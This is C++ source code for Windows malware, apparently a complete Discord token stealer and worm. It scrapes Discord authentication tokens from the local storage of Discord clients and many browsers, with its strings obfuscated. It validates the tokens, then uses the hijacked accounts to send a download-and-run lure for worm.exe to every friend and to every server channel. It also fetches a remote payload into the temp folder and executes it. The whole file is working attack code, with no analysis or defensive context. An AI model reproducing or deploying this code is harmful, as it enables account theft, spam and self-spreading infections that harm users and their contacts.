#include "main.hpp"
#include "xorstr.hpp"
#include <cpr/cpr.h>
#include <filesystem>
#include <fstream>
#include <nlohmann/json.hpp>
#include <optional>
#include <regex>
#include <sstream>
#include <thread>
#include <vector>

#define DM_MESSAGE "Hello please download and run this :) https://example.com/worm.exe"
#define SERVER_MESSAGE "Hello I am in a server, please download and run this :) https://example.com/worm.exe"
#define PAYLOAD_URL "https://example.com/payload.exe"
//					^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ This has to be a direct link


using namespace std;
using namespace std::filesystem;
using namespace nlohmann;

#define FIND(needle, haystack) std::find(haystack.begin(), haystack.end(), needle) != haystack.end()

regex tokenPattern(X("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
regex mfaTokenPattern(X("mfa\\.[\\w-]{84}"));
vector<string> tokens;
vector<string> channelsSentIn;

void FindTokens(const path path) {
	const auto leveldb = path / X("Local Storage") / X("leveldb");
	if (!exists(leveldb))
		return;

	for (const auto &file : directory_iterator(leveldb)) {
		const auto extension = file.path().extension();
		if (extension != X(".ldb") && extension != X(".log"))
			continue;

		ifstream t(file.path(), ios::binary);
		stringstream buffer;
		buffer << t.rdbuf();
		string s = buffer.str();

		for (auto it = sregex_iterator(s.begin(), s.end(), mfaTokenPattern); it != sregex_iterator(); ++it) {
			const auto token = it->str();
			if (FIND(token, tokens))
				continue;
			tokens.push_back(token);
		}

		for (auto it = sregex_iterator(s.begin(), s.end(), tokenPattern); it != sregex_iterator(); ++it) {
			const auto token = it->str();
			if (FIND(token, tokens))
				continue;
			tokens.push_back(token);
		}
	}
}

void ProcessChannel(string token, string channelId, bool server = false) {
	// Channel Mutex
	if (FIND(channelId, channelsSentIn))
		return;
	channelsSentIn.push_back(channelId);

	// Send in channel
	std::ostringstream channelUrl;
	channelUrl << X("https://discord.com/api/v9/channels/") << channelId << X("/messages");

	cpr::Post(
		cpr::Url{channelUrl.str()}, cpr::Header{{X("Authorization"), token}},
		cpr::Multipart{{X("tts"), X("false")},
			{X("content"),
			 server ? DM_MESSAGE : SERVER_MESSAGE}});
}

enum Permission { ADMINISTRATOR = 1 << 3, MANAGE_CHANNELS = 1 << 4, MENTION_EVERYONE = 1 << 17 };

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
	// Discord token locations
	auto local = path(getenv("LOCALAPPDATA"));
	auto roaming = path(getenv("APPDATA"));

	const auto paths = {
		roaming / X("Discord"),															 // Discord
		roaming / X("discordcanary"),													 // Discord Canary
		roaming / X("discordptb"),														 // Discord PTB
		roaming / X("Lightcord"),														 // Lightcord
		roaming / X("Opera Software") / X("Opera Stable"),								 // Opera
		roaming / X("Opera Software") / X("Opera GX Stable"),							 // Opera GX Stable
		local / X("Amigo") / X("User Data"),											 // Amigo
		local / X("Torch") / X("User Data"),											 // Torch
		local / X("Kometa") / X("User Data"),											 // Kometa
		local / X("Orbitum") / X("User Data"),											 // Orbitum
		local / X("CentBrowser") / X("User Data"),										 // CentBrowser
		local / X("7Star") / X("7Star") / X("User Data"),								 // 7Star
		local / X("Sputnik") / X("Sputnik") / X("User Data"),							 // Sputnik
		local / X("Vivaldi") / X("User Data") / X("Default"),							 // Sputnik
		local / X("Google") / X("Chrome SxS") / X("User Data"),							 // Chrome SxS
		local / X("Google") / X("Chrome") / X("User Data") / X("Default"),				 // Chrome
		local / X("Epic Privacy Browser") / X("User Data"),								 // Epic Privacy Browser
		local / X("Microsoft") / X("Edge") / X("User Data") / X("Default"),				 // Edge
		local / X("BraveSoftware") / X("Brave-Browser") / X("User Data") / X("Default"), // Brave
		local / X("Yandex") / X("YandexBrowser") / X("User Data") / X("Default"),		 // Yandex
	};

	// Find tokens, use threads to improve performance
	vector<thread> tokenFinderThreads;
	for (const auto &path : paths) {
		tokenFinderThreads.push_back(thread(FindTokens, path));
	}

	for (auto &t : tokenFinderThreads) {
		t.join();
	}

	vector<string> usedAccounts;
	vector<thread> speadingThreads;
	for (auto &token : tokens) {
		speadingThreads.push_back(thread(
			[&usedAccounts](string token) {
				// Request and make sure the token is valid
				auto headers = cpr::Header{{X("Authorization"), token}, {X("Content-Type"), X("application/json")}};
				auto _me = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me")}, headers);
				if (_me.status_code != 200)
					return;
				// Parse & make sure accounts are not used twice
				auto me = json::parse(_me.text);
				if (FIND(me[X("id")], usedAccounts))
					return;
				usedAccounts.push_back(me[X("id")]);

				auto _friends = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me/relationships")}, headers);
				auto friends = json::parse(_friends.text);

				// Message all friends
				for (auto &_friend : friends) {
					json channelPayload{{X("recipients"), json::array({_friend[X("id")]})}};
					auto _channel = cpr::Post(cpr::Url{X("https://discord.com/api/v9/users/@me/channels")}, headers,
											  cpr::Body{channelPayload.dump(-1)});
					std::string channelId = json::parse(_channel.text)[X("id")];
					ProcessChannel(token, channelId);
				}

				// Spam servers
				auto _guilds = cpr::Get(cpr::Url{X("https://discord.com/api/v9/users/@me/guilds")}, headers);
				auto guilds = json::parse(_guilds.text);
				for (auto &guild : guilds) {
					std::string guildId = guild[X("id")];
					std::ostringstream channelsUrl;
					channelsUrl << X("https://discord.com/api/v9/guilds/") << guildId << X("/channels");
					auto _channels = cpr::Get(cpr::Url{channelsUrl.str()}, headers);
					auto channels = json::parse(_channels.text);

					for (auto &channel : channels) {
						ProcessChannel(token, channel[X("id")], true);
					}
				}
			},
			token));
	}

	thread payload([] {
		// Download File
		auto payloadPath = path(getenv(X("temp"))) / X("tmp.exe");
		auto out = std::ofstream(payloadPath.string(), ios::binary);
		auto session = cpr::Session();
		session.SetUrl(cpr::Url{X(PAYLOAD_URL)});
		session.Download(out);
		out.close();

		// Run file
		system((X("start ") + payloadPath.string()).c_str());
	});

	payload.join();
	for (auto &t : speadingThreads) {
		t.join();
	}

	return 0;
}
